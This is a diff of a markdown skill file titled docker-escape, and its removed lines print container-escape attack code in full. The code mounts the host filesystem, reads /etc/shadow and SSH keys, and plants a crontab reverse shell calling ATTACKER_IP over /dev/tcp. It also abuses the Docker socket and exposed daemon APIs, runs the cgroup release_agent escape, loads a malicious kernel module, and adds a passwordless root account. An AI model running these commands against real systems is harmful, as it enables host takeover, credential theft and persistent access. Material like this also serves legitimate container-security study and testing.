@@ -1,4 +1,4 @@
----
+﻿---
 name: docker-escape
 description: "Docker container escape techniques including privilege escalation, socket abuse, and namespace breakout"
 category: specialized
@@ -52,53 +52,15 @@ Before attempting escape, confirm you are actually in a container and identify i
 
 ### Filesystem Indicators
 
-```bash
-# Check for dockerenv file (present in most Docker containers)
-ls -la /.dockerenv
-
-# Check /proc/1/cgroup — containers show docker or containerd paths
-cat /proc/1/cgroup
-
-# Check for container-related environment variables
-env | grep -i container
-env | grep -i docker
-
-# Check hostname (often the container ID)
-hostname
-```
 
 ### Cgroup Detection
 
-```bash
-# If cgroup output contains "docker" or container IDs, you are in a container
-cat /proc/1/cgroup | grep -i docker
-cat /proc/1/cgroup | grep -i containerd
-
-# systemd-based containers show /system.slice/docker-<id>.scope
-cat /proc/1/cgroup | grep system.slice
-```
 
 ### Process Table Analysis
 
-```bash
-# PID 1 is typically the entrypoint, not init — confirms containerization
-ps aux
-
-# In a container, PID 1 is usually the app process, not systemd
-# In a VM or host, PID 1 is init/systemd
-cat /proc/1/cmdline
-```
 
 ### Mount Enumeration
 
-```bash
-# List all mounts to find host volumes or socket mounts
-mount
-cat /proc/mounts
-
-# Look for docker.sock, host filesystem mounts, or proc/sysrq-trigger
-mount | grep -E "docker.sock|/host|/proc/sysrq"
-```
 
 ---
 
@@ -108,77 +70,18 @@ A privileged container has nearly all host capabilities and can mount the host f
 
 ### Detection
 
-```bash
-# Check if running as privileged
-cat /proc/1/status | grep CapEff
-# CapEff: 0000003fffffffff = fully privileged
-
-# Compare against standard capabilities
-# Unprivileged: 00000000a80425fb
-# Privileged:   0000003fffffffff
-```
 
 ### Mount Host Filesystem
 
-```bash
-# Create a mount point
-mkdir -p /host
-
-# Mount the host root filesystem
-mount /dev/sda1 /host
-# or if sda1 is not available, try:
-ls /dev/sd*
-ls /dev/vd*
-
-# If multiple disks are available, identify the correct one
-fdisk -l
-
-# Once mounted, access host files
-chroot /host
-
-# You now have root on the host
-whoami
-id
-cat /etc/shadow
-```
 
 ### Alternative: Use nsenter to Enter Host Namespace
 
-```bash
-# nsenter enters the namespaces of PID 1 on the host
-# This works because privileged containers share the host PID namespace
-nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash
-
-# If nsenter is not available, install it
-apt-get update && apt-get install -y util-linux
-```
 
 ### Mount Host Docker Socket
 
-```bash
-# If /dev is accessible, mount the host's docker socket
-mount /dev/sda1 /mnt
-mkdir -p /mnt/var/run
-cp /var/run/docker.sock /mnt/var/run/docker.sock 2>/dev/null
-
-# Or directly mount if device is available
-ls /dev/sda*
-mount /dev/sda2 /mnt  # root partition may not be sda1
-```
 
 ### Write to Host Filesystem
 
-```bash
-# Mount host root
-mount /dev/sda1 /host
-
-# Add SSH key for persistent access
-mkdir -p /host/root/.ssh
-echo "ssh-rsa AAAA..." >> /host/root/.ssh/authorized_keys
-
-# Or install a reverse shell in host crontab
-echo "* * * * * bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1" >> /host/var/spool/cron/crontabs/root
-```
 
 ---
 
@@ -188,71 +91,15 @@ If `/var/run/docker.sock` is mounted inside the container, you can control the D
 
 ### Verify Socket Access
 
-```bash
-# Check if the socket is mounted
-ls -la /var/run/docker.sock
-
-# Test API access
-curl --unix-socket /var/run/docker.sock http://localhost/version
-curl --unix-socket /var/run/docker.sock http://localhost/containers/json
-```
 
 ### Escape by Creating a Privileged Container
 
-```bash
-# Create a new container with host root mounted and privileged mode
-curl --unix-socket /var/run/docker.sock -X POST \
-  -H "Content-Type: application/json" \
-  -d '{
-    "Image": "alpine",
-    "Cmd": ["chroot", "/host", "bash"],
-    "Privileged": true,
-    "Binds": ["/:/host:rw"],
-    "Tty": true,
-    "OpenStdin": true
-  }' \
-  http://localhost/containers/create?name=escape
-
-# Start the container
-curl --unix-socket /var/run/docker.sock -X POST \
-  http://localhost/containers/escape/start
-
-# Attach to get a shell on the host
-curl --unix-socket /var/run/docker.sock -X POST \
-  -H "Content-Type: application/json" \
-  -d '{"Detach": false}' \
-  http://localhost/containers/escape/attach
-```
 
 ### Alternative: Run with Host PID Namespace
 
-```bash
-# Create container sharing host PID namespace
-curl --unix-socket /var/run/docker.sock -X POST \
-  -H "Content-Type: application/json" \
-  -d '{
-    "Image": "alpine",
-    "Cmd": ["/bin/sh"],
-    "HostConfig": {
-      "PidMode": "host",
-      "Binds": ["/:/host:rw"]
-    }
-  }' \
-  http://localhost/containers/create?name=pid-escape
-
-curl --unix-socket /var/run/docker.sock -X POST \
-  http://localhost/containers/pid-escape/start
-```
 
 ### Extract Secrets from Host
 
-```bash
-# Once you have host access via socket abuse
-cat /host/etc/shadow
-cat /host/root/.ssh/id_rsa
-cat /host/etc/kubernetes/admin.conf  # kubeconfig
-docker --unix-socket /var/run/docker.sock ps  # list all containers
-```
 
 ---
 
@@ -262,37 +109,9 @@ Containers sharing the host PID or network namespace have direct access to host 
 
 ### HostPID — Access Host Processes
 
-```bash
-# If pidMode is "host", /proc contains host processes
-ls /proc | grep -E "^[0-9]+$" | head -20
-
-# Find host SSH keys or sensitive processes
-cat /proc/1/environ | tr '\0' '\n'
-
-# Inject into host process memory (requires SYS_PTRACE)
-nsenter --target $(pgrep -f sshd) -- /bin/bash
-
-# Read environment variables of host processes (may contain secrets)
-for pid in $(ls /proc | grep -E "^[0-9]+$"); do
-  echo "=== PID $pid ==="
-  cat /proc/$pid/environ 2>/dev/null | tr '\0' '\n'
-done
-```
 
 ### HostNetwork — Sniff Host Traffic
 
-```bash
-# If networkMode is "host", you share the host network stack
-ip addr show
-# Should show host interfaces, not just container veth
-
-# Capture traffic on host interfaces
-tcpdump -i eth0 -w /tmp/capture.pcap
-
-# Access services bound to localhost on the host
-curl http://127.0.0.1:6443/version  # Kubernetes API
-curl http://127.0.0.1:2375/version  # Docker API
-```
 
 ---
 
@@ -302,54 +121,9 @@ Cgroup escape uses the Linux cgroup subsystem to execute commands on the host. T
 
 ### Classic cgroup release_agent Escape
 
-```bash
-# Requires: privileged container or CAP_SYS_ADMIN
-# Works on: kernels < 5.x reliably, 5.x+ with conditions
-
-# Step 1: Ensure host cgroup namespace is accessible
-d=$(dirname $(ls -x /s*/fs/c*/*/r* | head -n1))
-mkdir -p $d/x
-
-# Step 2: Write the exploit payload
-echo 1 > $d/x/notify_on_release
-host_path=$(sed -n -e '/s/.*\uperdir=\([^,]*\).*/\1/p' /etc/mtab)
-echo "$host_path/cmd" > $d/release_agent
-
-# Step 3: Create the command to execute on the host
-echo '#!/bin/sh' > /cmd
-echo "cat /etc/shadow > $host_path/output" >> /cmd
-chmod +x /cmd
-
-# Step 4: Trigger the cgroup
-sh -c "echo \$\$ > $d/x/cgroup.procs"
-
-# Step 5: Read the output
-cat /output
-```
 
 ### Modern cgroup v2 Escape
 
-```bash
-# cgroup v2 uses different mechanisms
-# Requires: CAP_SYS_ADMIN or privileged
-
-# Check cgroup version
-stat -f /sys/fs/cgroup
-# Type: cgroup2fs = v2, tmpfs = v1
-
-# For cgroup v2, use release_agent equivalent
-echo 'mount -t cgroup -o rdma cgroup /sys/fs/cgroup 2>/dev/null; sh /tmp/exploit.sh' > /tmp/trigger
-chmod +x /tmp/trigger
-
-# Alternative: use user namespaces + cgroup escape
-unshare --mount --propagation unchanged bash -c '
-  mount -t cgroup -o rdma cgroup /sys/fs/cgroup
-  mkdir -p /sys/fs/cgroup/x
-  echo 1 > /sys/fs/cgroup/x/notify_on_release
-  echo "$HOST_PATH/cmd" > /sys/fs/cgroup/release_agent
-  echo $$ > /sys/fs/cgroup/x/cgroup.procs
-'
-```
 
 ---
 
@@ -371,74 +145,12 @@ Linux capabilities grant granular kernel-level privileges. Abusable capabilities
 
 ### SYS_PTRACE Escape
 
-```bash
-# Check current capabilities
-cat /proc/self/status | grep Cap
-
-# Find a process running as root on the host (if pidMode=host)
-ps aux | grep root
-
-# Attach to host process and inject shellcode
-# Requires ptrace to be enabled on the host kernel
-nsenter --target $(pgrep -o -f "sshd") -- /bin/bash
-
-# Alternatively, use gdb to inject code
-apt-get install -y gdb
-gdb -p $(pgrep -f sshd)
-(gdb) call (int)system("chmod +s /bin/bash")
-```
 
 ### SYS_ADMIN — Mount FUSE/Overlay
 
-```bash
-# CAP_SYS_ADMIN allows mounting overlay filesystems
-# This can be used to overlay the host filesystem
-
-mkdir -p /tmp/upper /tmp/work /merged
-mount -t overlay overlay \
-  -o lowerdir=/,upperdir=/tmp/upper,workdir=/tmp/work \
-  /merged
-
-# /merged now contains a writable copy of the root filesystem
-ls /merged/etc/shadow
-chroot /merged
-```
 
 ### SYS_MODULE — Load Kernel Module
 
-```bash
-# CAP_SYS_MODULE allows loading kernel modules — the ultimate escape
-# Create a malicious kernel module
-
-cat > /tmp/evil.c << 'EOF'
-#include <linux/module.h>
-#include <linux/kernel.h>
-#include <linux/init.h>
-
-MODULE_LICENSE("GPL");
-
-static int __init evil_init(void) {
-    struct cred *new_cred;
-    new_cred = prepare_creds();
-    if (new_cred) {
-        new_cred->uid = 0;
-        new_cred->gid = 0;
-        commit_creds(new_cred);
-    }
-    return 0;
-}
-
-static void __exit evil_exit(void) {}
-
-module_init(evil_init);
-module_exit(evil_exit);
-EOF
-
-# Compile and load (requires kernel headers in the container)
-apt-get install -y linux-headers-$(uname -r) build-essential
-make -C /lib/modules/$(uname -r)/build M=/tmp modules
-insmod /tmp/evil.ko
-```
 
 ---
 
@@ -448,49 +160,12 @@ Exposed Docker daemon APIs are a critical attack surface. The daemon may listen 
 
 ### Detection
 
-```bash
-# Scan for exposed Docker API ports
-curl -s http://TARGET:2375/version
-curl -s https://TARGET:2376/version --insecure
-
-# List containers
-curl http://TARGET:2375/containers/json
-
-# List images
-curl http://TARGET:2375/images/json
-```
 
 ### Escape via API
 
-```bash
-# Create a privileged container with host root mounted
-curl -X POST http://TARGET:2375/containers/create \
-  -H "Content-Type: application/json" \
-  -d '{
-    "Image": "alpine",
-    "Cmd": ["/bin/sh"],
-    "HostConfig": {
-      "Privileged": true,
-      "Binds": ["/:/host:rw"]
-    }
-  }'
-
-# Start and attach
-curl -X POST http://TARGET:2375/containers/<ID>/start
-curl -X POST http://TARGET:2375/containers/<ID>/exec \
-  -d '{"Cmd": ["chroot", "/host", "/bin/sh"], "AttachStdout": true}'
-```
 
 ### Extract Credentials
 
-```bash
-# Pull sensitive containers and inspect for secrets
-curl http://TARGET:2375/containers/json | jq '.[].Image'
-curl -X POST http://TARGET:2375/containers/<ID>/json | jq '.Config.Env'
-
-# Check Docker daemon configuration
-curl http://TARGET:2375/info | jq
-```
 
 ---
 
@@ -512,31 +187,9 @@ Mounted host volumes provide direct filesystem access to the host.
 
 ### Read Host Secrets
 
-```bash
-# If /etc/shadow is mounted
-cat /host/etc/shadow
-
-# If SSH keys are mounted
-cat /host/root/.ssh/id_rsa
-cat /host/root/.ssh/authorized_keys
-
-# If kubeconfig is mounted
-cat /host/etc/kubernetes/admin.conf
-export KUBECONFIG=/host/etc/kubernetes/admin.conf
-kubectl get pods --all-namespaces
-```
 
 ### Write to Host Filesystem via Volume
 
-```bash
-# If a writable volume is mounted
-echo 'root2::0:0:root:/root:/bin/bash' >> /host/etc/passwd
-echo '*:*:0:0:99999:7:::' >> /host/etc/shadow
-
-# Or add SSH key
-mkdir -p /host/root/.ssh
-echo "ssh-rsa AAAA..." >> /host/root/.ssh/authorized_keys
-```
 
 ---
 
